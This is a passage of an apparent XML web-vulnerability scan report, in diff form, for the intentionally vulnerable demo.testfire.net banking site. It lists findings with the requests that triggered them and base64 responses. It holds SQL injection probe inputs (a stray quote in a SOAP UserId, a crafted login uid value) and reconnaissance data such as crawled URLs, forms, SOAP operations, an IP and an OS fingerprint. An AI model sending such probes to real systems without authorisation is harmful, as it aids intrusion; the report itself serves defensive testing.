+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>'</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/bank/ws.asmx?WSDL</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Content-Type</key>
+                                    <value><![CDATA[ text/xml; charset=utf-8]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key><![CDATA[<?xml version='1.0' encoding='UTF-8' standalone='no' ?><SOAP-ENV]]></key>
+                                    <value><![CDATA[Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:ns1="http://www.altoromutual.com/bank/ws/"><SOAP-ENV:Body><IsValidUser xmlns="http://www.altoromutual.com/bank/ws/"><UserId>1'</UserId></IsValidUser></SOAP-ENV:Body></SOAP-ENV:Envelope>]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[YXAvZW52ZWxvcGUvIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1h
+LWluc3RhbmNlIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj48
+c29hcDpCb2R5Pjxzb2FwOkZhdWx0PjxmYXVsdGNvZGU+c29hcDpTZXJ2ZXI8L2ZhdWx0Y29kZT48
+ZmF1bHRzdHJpbmc+U2VydmVyIHdhcyB1bmFibGUgdG8gcHJvY2VzcyByZXF1ZXN0LiAtLS0+IFN5
+bnRheCBlcnJvciBpbiBzdHJpbmcgaW4gcXVlcnkgZXhwcmVzc2lvbiAndXNlcmlkID0gMScnLjwv
+ZmF1bHRzdHJpbmc+PGRldGFpbCAvPjwvc29hcDpGYXVsdD48L3NvYXA6Qm9keT48L3NvYXA6RW52
+ZWxvcGU+
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[dGF4IGVycm9yIGluIHN0cmluZyBpbiBxdWVyeSBleHByZXNzaW9uICd1
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034762</ID>
+                <DETECTION_ID>4293581</DETECTION_ID>
+                <QID>150112</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VGhlIGZvbGxvd2luZyBwYXNzd29yZCBmaWVsZChzKSBpbiB0aGUgZm9ybSBkbyBub3Qgc2V0IGF1
+dG9jb21wbGV0ZT0ib2ZmIjoKKEZpZWxkIG5hbWU6IHBhc3N3LCBGaWVsZCBpZDogcGFzc3cpClBh
+cmVudCBVUkwgb2YgZm9ybSBpczogaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2JhbmsvbG9naW4u
+YXNweAo=
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034764</ID>
+                <DETECTION_ID>4293583</DETECTION_ID>
+                <QID>150122</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[YW1TZXNzaW9uSWQ9MTMyMjcxODk5MTAwOyBwYXRoPS87IGRvbWFpbj1kZW1vLnRlc3RmaXJlLm5l
+dA==
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034758</ID>
+                <DETECTION_ID>4293577</DETECTION_ID>
+                <QID>150003</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <PARAM>uid</PARAM>
+                <FORM_ENTRY_POINT>http://demo.testfire.net/bank/login.aspx</FORM_ENTRY_POINT>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD><![CDATA[uid=z--%3E%3Cqss%3E&passw=password&btnSubmit=Login]]></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[CSAgPC90cj4NCgkgIDwvdGFibGU+DQoJPC9mb3JtPg0KPC9kaXY+DQoNCjxkaXYgaWQ9IndyYXBw
+ZXIiIHN0eWxlPSJ3aWR0aDogOTklOyI+DQogICAgDQoNCjxkaXYgY2xhc3M9ImVyciIgc3R5bGU9
+IndpZHRoOiA5OSU7Ij4NCg0KPGgxPkFuIEVycm9yIEhhcyBPY2N1cnJlZDwvaDE+DQoNCjxoMj5T
+dW1tYXJ5OjwvaDI+DQoNCjxwPjxiPjxzcGFuIGlkPSJfY3RsMF9Db250ZW50X2xibFN1bW1hcnki
+PlN5bnRheCBlcnJvciBpbiBzdHJpbmcgaW4gcXVlcnkgZXhwcmVzc2lvbiAndXNlcm5hbWUgPSAn
+eicuDTwvc3Bhbj48L2I+PC9wPg0KDQo8aDI+RXJyb3IgTWVzc2FnZTo8L2gyPg0KDQo8cD48c3Bh
+biBpZD0iX2N0bDBfQ29udGVudF9sYmxEZXRhaWxzIj5TeXN0ZW0uRGF0YS5PbGVEYi5PbGVEYkV4
+Y2VwdGlvbjogU3ludGF4IGVycm9yIGluIHN0cmluZyBpbiBxdWVyeSBleHByZXNzaW9uICd1c2Vy
+bmFtZSA9ICd6Jy4NCiAgIGF0IFN5c3RlbS5EYXRhLk9sZURiLk9sZURiQ28=
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[U3ludGF4IGVycm9yIGluIHN0cmluZyBpbiBxdWVyeSBleHByZXNzaW9u
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034750</ID>
+                <DETECTION_ID>4293569</DETECTION_ID>
+                <QID>150124</QID>
+                <URL>http://demo.testfire.net/</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VGhlIFVSSSB3YXMgZnJhbWVkLgo=
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+        </VULNERABILITY_LIST>
+        <INFORMATION_GATHERED_LIST>
+            <INFORMATION_GATHERED>
+                <ID>245034725</ID>
+                <DETECTION_ID>1418269</DETECTION_ID>
+                <QID>150086</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[U2VydmVyIHJlc3BvbmRlZCAyMDAgdG8gdW5uZWNlc3NhcmlseSBsYXJnZSByYW5kb20gcmVxdWVz
+dCBib2R5KG92ZXIgNjQgS0IpIGZvciBVUkwgaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L3NlYXJj
+aC5hc3B4LCBzaWduaWZpY2FudGx5IGluY3JlYXNpbmcgYXR0YWNrZXIncyBjaGFuY2VzIHRvIHBy
+b2xvbmcgc2xvdyBIVFRQIFBPU1QgYXR0YWNrLg==
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034723</ID>
+                <DETECTION_ID>1418108</DETECTION_ID>
+                <QID>150176</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[Ck51bWJlciBvZiB1bmlxdWUgSlMgbGlicmFyaWVzOiAw
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034729</ID>
+                <DETECTION_ID>1418112</DETECTION_ID>
+                <QID>150058</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[U1dGIGZpbGU6IGh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9zdWJzY3JpYmUuc3dmCiAgICAgVmVy
+c2lvbjogNgogICAgIFN0YXR1czogUGFyc2VkIHN1Y2Nlc3NmdWxseQogICAgRXh0cmFjdGVkIGxp
+bmtzOiAwCiAgICBMaW5rczogCgo=
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034736</ID>
+                <DETECTION_ID>1418118</DETECTION_ID>
+                <QID>150010</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[TnVtYmVyIG9mIGxpbmtzOiA4Cmh0dHA6Ly93d3cuYWRvYmUuY29tL3Byb2R1Y3RzL2Fjcm9iYXQv
+cmVhZHN0ZXAyLmh0bWwKaHR0cDovL2ZwZG93bmxvYWQubWFjcm9tZWRpYS5jb20vcHViL3Nob2Nr
+d2F2ZS9jYWJzL2ZsYXNoL3N3Zmxhc2guY2FiCmh0dHA6Ly93d3cuY2VydC5vcmcvCmh0dHA6Ly93
+d3cubmV3c3BhcGVyc3luZGljYXRpb25zLnR2LwpodHRwOi8vZGVtby1hbmFseXRpY3MudGVzdGZp
+cmUubmV0L3VyY2hpbi5qcwpmaWxlOi8vL0M6JTVDbXklMjBkb2N1bWVudHMlNUNKb2huU21pdGgl
+NUNCYW5rJTIwU2l0ZSUyMERvY3VtZW50cyU1Q2dyb3VwbGlmZS5odG0KaHR0cDovL3d3dy5tYWNy
+b21lZGlhLmNvbS9nby9nZXRmbGFzaHBsYXllcgpodHRwOi8vd3d3LndhdGNoZmlyZS5jb20vc3Rh
+dGVtZW50cy90ZXJtcy5hc3B4Cg==
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034731</ID>
+                <DETECTION_ID>1418271</DETECTION_ID>
+                <QID>150126</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[OTc0LjkwMDAwMCBieXRlcy9zZWMgaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L25vdGZvdW5kLmFz
+cHglM0Zhc3B4ZXJyb3JwYXRoPS9Qcml2YWN5cG9saWN5LmFzcHgKMTAwMi4zMDAwMDAgYnl0ZXMv
+c2VjIGh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9zZWN1cml0eS5odG0KMTI0Ny45MDAwMDAgYnl0
+ZXMvc2VjIGh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9iYW5rL3RyYW5zYWN0aW9uLmFzcHgKMTQ2
+Ni4wMDAwMDAgYnl0ZXMvc2VjIGh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9iYW5rL3RyYW5zZmVy
+LmFzcHgKMTYxMi43MDAwMDAgYnl0ZXMvc2VjIGh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9iYW5r
+L2FwcGx5LmFzcHgKNzYxMzMuNjAwMDAwIGJ5dGVzL3NlYyBodHRwOi8vZGVtby50ZXN0ZmlyZS5u
+ZXQvcHIvRHJhZnQucnRmCjg2NjY3Mi42MDAwMDAgYnl0ZXMvc2VjIGh0dHA6Ly9kZW1vLnRlc3Rm
+aXJlLm5ldC9wci9RM19lYXJuaW5ncy5ydGYKMTEwMDA1NS42MDAwMDAgYnl0ZXMvc2VjIGh0dHA6
+Ly9kZW1vLnRlc3RmaXJlLm5ldC9wci9jb21tdW5pdHlhbm51YWxyZXBvcnQucGRmCjE2OTgxMTIu
+ODAwMDAwIGJ5dGVzL3NlYyBodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYWRtaW4vY2xpZW50cy54
+bHMKMTk0NDc1My4yMDAwMDAgYnl0ZXMvc2VjIGh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9jZ2ku
+ZXhlCg==
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034730</ID>
+                <DETECTION_ID>1418113</DETECTION_ID>
+                <QID>150152</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[VG90YWwgaW50ZXJuYWwgZm9ybXMgc2VlbiAodGhpcyBjb3VudCBpbmNsdWRlcyBkdXBsaWNhdGUg
+Zm9ybXMpOiAyCgpDcmF3bGVkIGZvcm1zIChUb3RhbDogMikKTk9URTogVGhpcyBkb2VzIG5vdCBp
+bmNsdWRlIGF1dGhlbnRpY2F0aW9uIGZvcm1zLiBBdXRoZW50aWNhdGlvbiBmb3JtcyBhcmUgcmVw
+b3J0ZWQgc2VwYXJhdGVseSBpbiBRSUQgMTUwMTE1CkZvcm0gIzoxIEFjdGlvbiBVUkk6aHR0cDov
+L2RlbW8udGVzdGZpcmUubmV0L3NlYXJjaC5hc3B4CkZvcm0gRmllbGRzOiB0eHRTZWFyY2gKCkZv
+cm0gIzoyIEFjdGlvbiBVUkk6aHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2NvbW1lbnQuYXNweApG
+b3JtIEZpZWxkczogY2ZpbGUsIG5hbWUsIGVtYWlsX2FkZHIsIHN1YmplY3QsIGNvbW1lbnRzLCBz
+dWJtaXQsIHJlc2V0Cgo=
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034726</ID>
+                <DETECTION_ID>1418270</DETECTION_ID>
+                <QID>150087</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[QVBJcyBmcm9tOiBodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay93cy5hc214P1dTREwKR2V0
+VXNlckFjY291bnRzCklzVmFsaWRVc2VyClRyYW5zZmVyQmFsYW5jZQoKQVBJcyBmcm9tOiBodHRw
+Oi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay93cy5hc214P3dzZGwKR2V0VXNlckFjY291bnRzCklz
+VmFsaWRVc2VyClRyYW5zZmVyQmFsYW5jZQoK
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034737</ID>
+                <DETECTION_ID>1418119</DETECTION_ID>
+                <QID>150042</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[aHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2JhbmsvY3VzdG9taXplLmFzcHgKaHR0cDovL2RlbW8u
+dGVzdGZpcmUubmV0L2JhbmsvcXVlcnl4cGF0aC5hc3B4Cmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5l
+dC9jb21tZW50LmFzcHgKaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9jb250
+ZW50PXBlcnNvbmFsX3NhdmluZ3MuaHRtCg==
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034735</ID>
+                <DETECTION_ID>1418117</DETECTION_ID>
+                <QID>150101</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[VG90YWwgY29va2llczogMQpUUkFDSz1RbFA3TXl0M3pmU01sU3dFSWg1STZkdHlvOyBwYXRoPS8g
+Rmlyc3Qgc2V0IGF0IFVSTDogaHR0cDovL3d3dy5hbHRvcm9tdXR1YWwuY29tL2J1Zy5hc3B4Cg==
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034727</ID>
+                <DETECTION_ID>1418110</DETECTION_ID>
+                <QID>6</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[I3RhYmxlCklQX2FkZHJlc3MgSG9zdF9uYW1lCgo2NS42MS4xMzcuMTE3IE5vX3JlZ2lzdGVyZWRf
+aG9zdG5hbWUK
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034739</ID>
+                <DETECTION_ID>1418121</DETECTION_ID>
+                <QID>45017</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[I3RhYmxlIGNvbHM9IjMiCk9wZXJhdGluZ19TeXN0ZW0gVGVjaG5pcXVlIElECgpXaW5kb3dzX1Zp
+c3RhXy9fV2luZG93c18yMDA4Xy9fV2luZG93c183Xy9fV2luZG93c18yMDEyIFRDUC9JUF9GaW5n
+ZXJwcmludCBVMzY3NTo4MAo=
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034740</ID>
+                <DETECTION_ID>1418122</DETECTION_ID>
+                <QID>150009</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[RHVyYXRpb24gb2YgY3Jhd2wgcGhhc2UgKHNlY29uZHMpOiAyMjEuMDAKTnVtYmVyIG9mIGxpbmtz
+OiA5MwooVGhpcyBudW1iZXIgZXhjbHVkZXMgZm9ybSByZXF1ZXN0cyBhbmQgbGlua3MgcmUtcmVx
+dWVzdGVkIGR1cmluZyBhdXRoZW50aWNhdGlvbi4pCgpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQv
+Cmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9Qcml2YWN5cG9saWN5LmFzcHg/c2VjPUNhcmVlcnMm
+dGVtcGxhdGU9VVMKaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2FkbWluL2NsaWVudHMueGxzCmh0
+dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9hbHRvcm8vaW1hZ2VzL2dyYWRpZW50LmpwZwpodHRwOi8v
+ZGVtby50ZXN0ZmlyZS5uZXQvYmFuay8yMDA2MDMwOF9iYWsvCmh0dHA6Ly9kZW1vLnRlc3RmaXJl
+Lm5ldC9iYW5rL2FjY291bnQuYXNweApodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay9hY2Nv
+dW50LmFzcHguY3MKaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2JhbmsvYXBwbHkuYXNweApodHRw
+Oi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay9hcHBseS5hc3B4LmNzCmh0dHA6Ly9kZW1vLnRlc3Rm
+aXJlLm5ldC9iYW5rL2JhbmsubWFzdGVyCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9iYW5rL2Jh
+bmsubWFzdGVyLmNzCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9iYW5rL2N1c3RvbWl6ZS5hc3B4
+Cmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9iYW5rL2N1c3RvbWl6ZS5hc3B4LmNzCmh0dHA6Ly9k
+ZW1vLnRlc3RmaXJlLm5ldC9iYW5rL2xvZ2luLmFzcHgKaHR0cDovL2RlbW8udGVzdGZpcmUubmV0
+L2JhbmsvbG9naW4uYXNweC5jcwpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay9tYWluLmFz
+cHgKaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2JhbmsvbWFpbi5hc3B4LmNzCmh0dHA6Ly9kZW1v
+LnRlc3RmaXJlLm5ldC9iYW5rL21lbWJlcnMvCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9iYW5r
+L3F1ZXJ5eHBhdGguYXNweApodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay9xdWVyeXhwYXRo
+LmFzcHguY3MKaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2Jhbmsvc2VydmVyZXJyb3IuYXNweApo
+dHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay90cmFuc2FjdGlvbi5hc3B4Cmh0dHA6Ly9kZW1v
+LnRlc3RmaXJlLm5ldC9iYW5rL3RyYW5zYWN0aW9uLmFzcHguY3MKaHR0cDovL2RlbW8udGVzdGZp
+cmUubmV0L2JhbmsvdHJhbnNmZXIuYXNweApodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay90
+cmFuc2Zlci5hc3B4LmNzCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9iYW5rL3dzLmFzbXgKaHR0
+cDovL2RlbW8udGVzdGZpcmUubmV0L2Jhbmsvd3MuYXNteD9XU0RMCmh0dHA6Ly9kZW1vLnRlc3Rm
+aXJlLm5ldC9iYW5rL3dzLmFzbXg/ZGlzY28KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2Jhbmsv
+d3MuYXNteD9vcD1HZXRVc2VyQWNjb3VudHMKaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2Jhbmsv
+d3MuYXNteD9vcD1Jc1ZhbGlkVXNlcgpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay93cy5h
+c214P29wPVRyYW5zZmVyQmFsYW5jZQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvY2dpLmV4ZQpo
+dHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvY29tbWVudC5hc3B4Cmh0dHA6Ly9kZW1vLnRlc3RmaXJl
+Lm5ldC9kZWZhdWx0LmFzcHgKaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9j
+b250ZW50PWJ1c2luZXNzLmh0bQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvZGVmYXVsdC5hc3B4
+P2NvbnRlbnQ9YnVzaW5lc3NfY2FyZHMuaHRtCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9kZWZh
+dWx0LmFzcHg/Y29udGVudD1idXNpbmVzc19kZXBvc2l0Lmh0bQpodHRwOi8vZGVtby50ZXN0Zmly
+ZS5uZXQvZGVmYXVsdC5hc3B4P2NvbnRlbnQ9YnVzaW5lc3NfaW5zdXJhbmNlLmh0bQpodHRwOi8v
+ZGVtby50ZXN0ZmlyZS5uZXQvZGVmYXVsdC5hc3B4P2NvbnRlbnQ9YnVzaW5lc3NfbGVuZGluZy5o
+dG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9jb250ZW50PWJ1c2luZXNz
+X290aGVyLmh0bQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvZGVmYXVsdC5hc3B4P2NvbnRlbnQ9
+YnVzaW5lc3NfcmV0aXJlbWVudC5odG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQu
+YXNweD9jb250ZW50PWluc2lkZS5odG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQu
+YXNweD9jb250ZW50PWluc2lkZV9hYm91dC5odG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2Rl
+ZmF1bHQuYXNweD9jb250ZW50PWluc2lkZV9iZW5lZml0cy5odG0KaHR0cDovL2RlbW8udGVzdGZp
+cmUubmV0L2RlZmF1bHQuYXNweD9jb250ZW50PWluc2lkZV9jYXJlZXJzLmh0bQpodHRwOi8vZGVt
+by50ZXN0ZmlyZS5uZXQvZGVmYXVsdC5hc3B4P2NvbnRlbnQ9aW5zaWRlX2NvbW11bml0eS5odG0K
+aHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9jb250ZW50PWluc2lkZV9jb250
+YWN0Lmh0bQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvZGVmYXVsdC5hc3B4P2NvbnRlbnQ9aW5z
+aWRlX2V4ZWN1dGl2ZXMuaHRtCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9kZWZhdWx0LmFzcHg/
+Y29udGVudD1pbnNpZGVfaW50ZXJuc2hpcHMuaHRtCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9k
+ZWZhdWx0LmFzcHg/Y29udGVudD1pbnNpZGVfaW52ZXN0b3IuaHRtCmh0dHA6Ly9kZW1vLnRlc3Rm
+aXJlLm5ldC9kZWZhdWx0LmFzcHg/Y29udGVudD1pbnNpZGVfam9icy5odG0KaHR0cDovL2RlbW8u
+dGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9jb250ZW50PWluc2lkZV9wcmVzcy5odG0KaHR0cDov
+L2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9jb250ZW50PWluc2lkZV90cmFpbmVlLmh0
+bQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvZGVmYXVsdC5hc3B4P2NvbnRlbnQ9am9icy8yMDA2
+MTAxOS5odG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9jb250ZW50PWpv
+YnMvMjAwNjEwMjMuaHRtCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9kZWZhdWx0LmFzcHg/Y29u
+dGVudD1qb2JzLzIwMDYxMDI1Lmh0bQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvZGVmYXVsdC5h
